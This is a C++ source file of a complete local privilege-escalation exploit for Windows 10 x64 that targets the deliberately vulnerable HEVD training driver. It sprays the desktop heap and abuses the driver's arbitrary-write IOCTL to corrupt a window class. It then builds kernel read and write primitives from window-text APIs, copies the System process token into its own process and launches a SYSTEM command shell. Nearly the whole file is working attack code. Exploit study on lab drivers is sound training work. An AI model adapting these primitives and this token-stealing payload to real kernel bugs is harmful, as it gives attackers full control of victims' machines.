// HEVD-ArbitraryWrite-Win10-x64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <stdio.h>

#define HEVD_IOCTL_ARBITRARY_WRITE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

/*offsets
offset between beginning tagCLS and manager: 0xe0 
offset between beginning tagCLS and cbClsExtra: 0x68
offset between beginning tagCLS and Extra bytes: 0xa8
offset between CLS extra bytes and worker rpDesk field: 0x210
offset between CLS extra bytes and worker strName field: 0x2d8
*/

typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, * PLARGE_UNICODE_STRING;

HWND* window_array = new HWND[0x1000];
const WCHAR CLASS_NAME[] = L"Sprayer";
const WCHAR CLASS_NAME_2[] = L"Manager";
const WCHAR CLASS_NAME_3[] = L"Worker";
WNDCLASSEX cls1, cls2, cls3;
HWND manager, worker;
DWORD64 teb = (DWORD64)NtCurrentTeb();
DWORD64 win32client = (teb + 0x800);
DWORD64 userDesktopHeapBase = *(PDWORD64)(win32client + 0x28);
DWORD64 kernelDesktopHeapBase = *(PDWORD64)(userDesktopHeapBase + 0x28);
DWORD64 delta = kernelDesktopHeapBase - userDesktopHeapBase;
DWORD64 managerAddr, workerAddr;
DWORD64 managerClassAddr;
PDWORD64 g_fakeDesktop;
PDWORD64 g_rpDesk;
PDWORD64 g_strName;
VersionSpecificConfig gConfig = { 0x2e0, 0x358 };

extern "C" VOID NtUserDefSetText(HWND hwnd, PLARGE_UNICODE_STRING pstrText);

LRESULT CALLBACK WProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc3(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

typedef NTSTATUS(NTAPI* pNtUserDefSetText)(
	HWND  ,
	LARGE_UNICODE_STRING *);

DWORD64 GetAddressFromHandle(HWND WNDHandle) {
	int i = 0;
	while (1) {
		if (*(PDWORD64)(userDesktopHeapBase + 8 * i) == (DWORD64)WNDHandle)
			break;
		else
			i++;
	}

	return (userDesktopHeapBase + 8 * i) + delta;
}

VOID RtlInitLargeUnicodeString(PLARGE_UNICODE_STRING plstr, CHAR* psz, UINT cchLimit)
{
	ULONG Length;
	plstr->Buffer = (WCHAR*)psz;
	plstr->bAnsi = FALSE;
	if (psz != NULL)
	{
		plstr->Length = cchLimit;
		plstr->MaximumLength = cchLimit + sizeof(UNICODE_NULL);
	}
	else
	{
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}

VOID setupFakeDesktop()
{
	g_fakeDesktop = (PDWORD64)VirtualAlloc((LPVOID)0x2a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(g_fakeDesktop, 0x11, 0x1000);
}

VOID getRpDesk() {
	PDWORD64  workerUserAddr = (PDWORD64)(workerAddr - delta);
	g_rpDesk = (PDWORD64)workerUserAddr[3];

}

VOID getStrName() {
	PDWORD64 workerUserAddr = (PDWORD64)(workerAddr - delta);
	g_strName = (PDWORD64)workerUserAddr[30];
}

DWORD64 readQword(DWORD64 addr) {
	
	//The top part of the code is to make sure that the address is not odd
	DWORD size = 0x18;
	DWORD offset = addr & 0xF;
	addr -= offset;

	WCHAR* data = new WCHAR[size + 1];
	ZeroMemory(data, size + 1);

	g_fakeDesktop[0x10] = addr - 0x100;
	g_fakeDesktop[0x11] = 0x200;
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetClassLongPtrW(manager, 0x210, (LONG_PTR)g_fakeDesktop);
	SetClassLongPtrW(manager, 0x2e0, 0x0000002800000020);
	SetClassLongPtrW(manager, 0x2e0 + 0x8, (LONG_PTR)addr);

	DWORD res = InternalGetWindowText(worker, data, size);

	SetClassLongPtrW(manager, 0x210, (LONG_PTR)g_rpDesk);
	SetClassLongPtrW(manager, 0x2e0, 0x0000000e0000000c);
	SetClassLongPtrW(manager, 0x2e0 + 0x8, (LONG_PTR)g_strName);

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

	DWORD64 value = *(PDWORD64)((DWORD64)data + offset);
	return value;
}

void writeQword(DWORD64 addr, DWORD64 value) {
	//The top part of the code is to make sure that the address is not odd
	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;
	DWORD64 size = 0x8 + offset;
	CHAR* input = new CHAR[size];
	LARGE_UNICODE_STRING uStr;
	pNtUserDefSetText ptrNtUserDefSetText;
	if (offset != 0)
	{
		filler = readQword(addr);
	}
	
	//putting values in little-endian format
	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (8 * i)) & 0xFF;
	}

	for (DWORD i = 0; i < 8; i++)
	{
		input[i + offset] = (value >> (8 * i)) & 0xFF;
	}

	RtlInitLargeUnicodeString(&uStr, input, size);

	g_fakeDesktop[0x1] = 0x0;
	g_fakeDesktop[0x10] = addr - 0x100;
	g_fakeDesktop[0x11] = 0x200;
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetClassLongPtrW(manager, 0x210, (LONG_PTR)g_fakeDesktop);
	SetClassLongPtrW(manager, 0x2e0, 0x0000002800000020);
	SetClassLongPtrW(manager, 0x2e0 + 0x8, (LONG_PTR)addr);

	NtUserDefSetText(worker, &uStr);

	SetClassLongPtrW(manager, 0x210, (LONG_PTR)g_rpDesk);
	SetClassLongPtrW(manager, 0x2e0, 0x0000000e0000000c);
	SetClassLongPtrW(manager, 0x2e0 + 0x8, (LONG_PTR)g_strName);

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);


}
// Get base of ntoskrnl.exe
DWORD64 GetNTOsBase()
{
	DWORD64 Bases[0x1000];
	DWORD needed = 0;
	DWORD64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID*)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

// Get EPROCESS for System process
DWORD64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	DWORD64 ntos = (DWORD64)LoadLibraryA((LPCSTR)"ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	DWORD64 addr = (DWORD64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	DWORD64 res = 0;
	DWORD64 ntOsBase = GetNTOsBase();
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) {
		res = readQword(addr - ntos + ntOsBase);
	}
	return res;
}

// Get EPROCESS for current process
DWORD64 PsGetCurrentProcess()
{
	DWORD64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

	// walk ActiveProcessLinks until we find our Pid
	
	DWORD64 flink = readQword(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(DWORD64));

	DWORD64 res = 0;

	while (TRUE) {
		DWORD64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (flink) - gConfig.UniqueProcessIdOffset - sizeof(DWORD64);
		// get pid
		UniqueProcessId = readQword(pEPROCESS + gConfig.UniqueProcessIdOffset);
		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		flink = readQword(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(DWORD64));
		// if next same as last, we reached the end
		if (pEPROCESS == (flink) - gConfig.UniqueProcessIdOffset - sizeof(DWORD64))
			break;
	}
	return res;
}

int main() {

	PDWORD64 uBuffer;
	LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\HackSysExtremeVulnerableDriver";
	DWORD bytesRet;
	int i=0;


	cls1.cbSize = sizeof(WNDCLASSEX);
	cls1.style = 0;
	cls1.lpfnWndProc = WProc1;
	cls1.cbClsExtra = 0x10;
	cls1.cbWndExtra = 0x8; //0x8
	cls1.hInstance = NULL;
	cls1.hCursor = NULL;
	cls1.hIcon = NULL;
	cls1.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls1.lpszMenuName = NULL;
	cls1.lpszClassName = CLASS_NAME;
	cls1.hIconSm = NULL;


	cls2.cbSize = sizeof(WNDCLASSEX);
	cls2.style = 0;
	cls2.lpfnWndProc = WProc2;
	cls2.cbClsExtra = 0x10;
	cls2.cbWndExtra = 0x10;
	cls2.hInstance = NULL;
	cls2.hCursor = NULL;
	cls2.hIcon = NULL;
	cls2.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls2.lpszMenuName = NULL;
	cls2.lpszClassName = CLASS_NAME_2;
	cls2.hIconSm = NULL;

	cls3.cbSize = sizeof(WNDCLASSEX);
	cls3.style = 0;
	cls3.lpfnWndProc = WProc2;
	cls3.cbClsExtra = 0x10;
	cls3.cbWndExtra = 0x10; //0x8
	cls3.hInstance = NULL;
	cls3.hCursor = NULL;
	cls3.hIcon = NULL;
	cls3.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls3.lpszMenuName = NULL;
	cls3.lpszClassName = CLASS_NAME_3;
	cls3.hIconSm = NULL;

	printf("[*] userDesktopHeapBase: 0x%p\n", userDesktopHeapBase);
	printf("[*] kernelDesktopHeapBase: 0x%p\n", kernelDesktopHeapBase);
	printf("[*] delta: 0x%p\n", delta);

	if (!RegisterClassEx(&cls1))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	if (!RegisterClassEx(&cls3))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//Spraying dekstop heap
	for (i = 0; i < 0x1000; i++) {
		window_array[i] = window_array[i] = CreateWindowEx(WS_EX_CLIENTEDGE, CLASS_NAME, L"Sprayer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
		
	}

	//allocating tagCLASS object that will work as the manager
	if (!RegisterClassEx(&cls2))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//allocating manager
	manager = CreateWindowEx(WS_EX_CLIENTEDGE, CLASS_NAME_2, L"Manager", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	//allocating worker
	worker = CreateWindowEx(WS_EX_CLIENTEDGE, CLASS_NAME_3, L"Worker", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	managerAddr = GetAddressFromHandle(manager);
	workerAddr = GetAddressFromHandle(worker);
	managerClassAddr = managerAddr - 0xe0;
	
	setupFakeDesktop();
	getRpDesk();
	getStrName();
	SetClassLongPtrA(manager,0,0x4142434445464748);

	//getting handle to driver 

	HANDLE hDriver = CreateFileA(lpDeviceName,           //File name - in this case our device name
		GENERIC_READ | GENERIC_WRITE,                   //dwDesiredAccess - type of access to the file, can be read, write, both or neither. We want read and write because thats the permission the driver declares we need.
		0,             //dwShareMode - other processes can read and write to the driver while we're using it but not delete it - FILE_SHARE_DELETE would enable this.
		NULL,                                           //lpSecurityAttributes - Optional, security descriptor for the returned handle and declares whether inheriting processes can access it - unneeded for us.
		OPEN_EXISTING,                                  //dwCreationDisposition - what to do if the file/device doesn't exist, in this case only opens it if it already exists, returning an error if it doesn't.
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,   //dwFlagsAndAttributes - In this case the FILE_ATTRIBUTE_NORMAL means that the device has no special file attributes and FILE_FLAG_OVERLAPPED means that the device is being opened for async IO.
		NULL);                                          //hTemplateFile - Optional, only used when creating a new file - takes a handle to a template file which defineds various attributes for the file being created.
	//Sending IOCTL request with malicious structure to trigger overwrite

	if ((int)hDriver == -1) {
		printf("[-] Driver not found.\n");
		exit(-1);
	}
	printf("[+] Sending IOCTL request\n");


	//allocating and filling user buffer
	uBuffer = (PDWORD64)VirtualAlloc(NULL, sizeof(DWORD64) * 2,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	DWORD64 what = 0x0000040000000400;

	uBuffer[0] = (DWORD64) &what;
	uBuffer[1] = managerClassAddr + 0x68;

	//Triggering arbitrary write vuln

	DeviceIoControl(hDriver,
		HEVD_IOCTL_ARBITRARY_WRITE,
		uBuffer,
		0x10,
		NULL, //No output buffer - we don't even know if the driver gives output #yolo.
		0,
		&bytesRet,
		NULL); //No overlap

	// get System EPROCESS
	DWORD64 SystemEPROCESS = PsInitialSystemProcess();
	printf("[+] system EPROCESS address: 0x%p\n", SystemEPROCESS);
	DWORD64 CurrentEPROCESS = PsGetCurrentProcess();
	printf("[+] current EPROCESS address: 0x%p\n", CurrentEPROCESS);
	// read token from system process
	DWORD64 SystemToken = readQword(SystemEPROCESS + gConfig.TokenOffset);
	printf("[*] replacing token structure...\n");
	// write token to current process
	writeQword(CurrentEPROCESS+gConfig.TokenOffset, SystemToken);
	//printf("val: 0x%p\n",val);
	system("cmd.exe");
}



